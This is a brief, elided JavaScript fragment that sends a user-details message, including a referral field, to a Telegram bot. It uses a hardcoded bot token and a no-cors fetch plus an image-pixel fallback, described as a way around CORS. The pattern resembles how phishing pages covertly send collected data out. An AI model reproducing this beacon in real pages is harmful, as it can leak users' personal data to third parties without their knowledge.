...
${user.referral ? '🔗 *Referred By:* ' + user.referral : '🔗 *Referred By:* None'}`;
            ...
            // Use URL-encoded GET via no-cors image trick to bypass CORS restrictions
            try {
                const encodedMsg = encodeURIComponent(message);
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMsg}&parse_mode=Markdown`;
                // Method 1: fetch with no-cors (fire and forget, no response needed)
                fetch(url, { method: 'GET', mode: 'no-cors' }).catch(() => {});
                // Method 2: image pixel fallback (extra reliability)
                const img = new Image();
                img.src = url;
            } catch(err) {
